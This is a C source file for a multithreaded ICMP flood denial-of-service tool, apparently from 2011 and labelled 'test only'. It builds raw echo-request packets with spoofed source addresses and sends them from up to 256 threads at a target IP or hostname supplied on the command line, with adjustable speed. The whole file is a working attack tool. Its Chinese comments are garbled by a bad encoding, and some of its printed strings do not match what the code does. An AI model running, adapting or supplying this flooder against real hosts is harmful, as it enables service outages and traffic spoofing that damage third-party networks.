/***************************************************************************************
* File Name: Dos_icmp.c
* Description: DOS attack for dest ip (test only)
* Creator: Almond.du
* Date: 2011-11-1
***************************************************************************************/
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>

/* ����߳��� */
#define MAXCHILD 256
#define MAXSPEED 100
/* Ŀ��IP ��ַ */
static unsigned long dest = 0;
/* ����ʹ�õ�����, ֻ������192.168���� */
static unsigned int netmask = 0;
static unsigned int speedcount = 0;
static unsigned int totalthread = 0;
/* ICMPЭ���ֵ */
static int PROTO_ICMP = -1;
/* ������־ */
static int alive = -1;
static int rawsock = 0;				/*���ͺͽ����߳���Ҫ��socket������*/




/* ���������������
*  ����ϵͳ�ĺ���Ϊα�������
*	�����ʼ���йأ����ÿ���ò�ֵͬ���г�ʼ��
*/
static inline long myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;
       static unsigned int n = 0; 

	/* ��ϵͳʱ���ʼ�� */
	//srand((unsigned)time(0));
       srand(n++);
	/* ����һ������begin��end֮���ֵ */
	//ret = random(end)%gap + begin;
	ret = random()%gap + begin;
	return ret;
}


static void
DoS_icmp (void)
{  
	struct sockaddr_in to;  
	struct ip *iph;  
	struct icmp *icmph;  
       
	char *packet;  
	int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;  
	packet = malloc (pktsize);  
	iph = (struct ip *) packet;  
	icmph = (struct icmp *) (packet + sizeof (struct ip));  
	memset (packet, 0, pktsize);  
	
	/* IP�İ汾,IPv4 */
	iph->ip_v = 4;  
	/* IPͷ������,�ֽ��� */
	iph->ip_hl = 5;  
	/* �������� */
	iph->ip_tos = 0;  
	/* IP���ĵ��ܳ��� */
	iph->ip_len = htons (pktsize);  
	/* ��ʶ,����ΪPID */
	iph->ip_id = htons (getpid ());  
	/* �εı��˵�ַ */
	iph->ip_off = 0; 
	/* TTL */
	iph->ip_ttl = 0x0;  
	/* Э������ */
	iph->ip_p = PROTO_ICMP;  
	/* У���,����дΪ0 */
	iph->ip_sum = 0;  
	/* ���͵�Դ��ַ */
	//iph->ip_src = (unsigned long) myrandom(0, 65535);  ;      
	//iph->ip_src.s_addr= (unsigned long) myrandom(0, 65535);  

	//iph->ip_src.s_addr= htonl(192<<24|168<<16|125<<8|(unsigned long) myrandom(1, 255));  
       iph->ip_src.s_addr= htonl(10<<24|82<<16|netmask<<8|(unsigned long) myrandom(1, 255));  
       //printf("dst ip : %u -> %s\n", iph->ip_src.s_addr, inet_ntoa(iph->ip_src));

       
	/* ����Ŀ���ַ */
	//iph->ip_dst = dest;    
	iph->ip_dst.s_addr = dest;   
 

	/* ICMP����Ϊ�������� */
	icmph->icmp_type = ICMP_ECHO;  
	/* ����Ϊ0 */
	icmph->icmp_code = 0;  
	/* �������ݲ���Ϊ0,���Ҵ���Ϊ0,ֱ�ӶԲ�Ϊ0��icmp_type���ּ��� */
	icmph->icmp_cksum = htons (~(ICMP_ECHO << 8));  

	/* ��д����Ŀ�ĵ�ַ���� */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = htons(0);

	/* �������� */
	sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));  
	/* �ͷ��ڴ� */
	free (packet);
}

static void *
DoS_fun (void *argv)
{  
	unsigned long count = 0;
	int speed = 100-speedcount;  //the lager the faster

	while(alive)
	{
		if((count%speed) == 0)
			DoS_icmp();
		count++;
	}

	return (void *)0;
}

/* �źŴ�������,�����˳�����alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
	printf("stop signal!\n");
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	
	alive = 1;
	/* ��ȡ�ź�CTRL+C */
	signal(SIGINT, DoS_sig);
	signal(SIGTSTP, DoS_sig);
	signal(SIGTERM, DoS_sig);



	/* �����Ƿ�������ȷ */
	if(argc != 5)
	{
		printf("arguments should be 5 : %d\n", argc);
		goto argerr;
	}

	/* ��ȡЭ������ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_ICMP = protocol->p_proto;

	/* �����Ŀ�ĵ�ַΪ�ַ���IP��ַ */
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		/* ΪDNS��ַ */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* ����ַ������dest�� */
		memcpy((char *)&dest, host->h_addr, host->h_length);
	}

       netmask = atoi(argv[2]);
       if(netmask > 254)
	{
		printf("subnet should be less than 255 : %d\n", netmask);
		goto argerr;
	}
	
       totalthread = atoi(argv[3]);
       if(totalthread > MAXCHILD)
	{
		printf("total thread should be less than %d : %d\n", MAXCHILD, totalthread);
		goto argerr;
	}

       speedcount = atoi(argv[4]);
       if(speedcount > MAXSPEED)
	{
		printf("test speed should be less than %d : %d\n", MAXSPEED, speedcount);
		goto argerr;
	}



	/* ����ԭʼsocket */
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);	
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);	

	/* ����IPѡ�� */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

       printf("attack addr : %s, use subnet = 192.168.%ld, total thread = %ld, test speed = %ld\n", argv[1], netmask, totalthread, speedcount);

	/* ��������߳�Эͬ���� */
	//for(i=0; i<MAXCHILD; i++)
	for(i=0; i<totalthread; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* �ȴ��߳̽��� */
	//for(i=0; i<MAXCHILD; i++)
	for(i=0; i<totalthread; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;

argerr:
	printf("\nUsage: test_dos <dest ip>  <subnet>  <total thread>  <test speed> \n");
	printf("subnet      : less than 255\n");
	printf("otal thread : less than %d\n", MAXCHILD);
	printf("test speed  : less than %d\n", MAXSPEED);
	return -1;
}



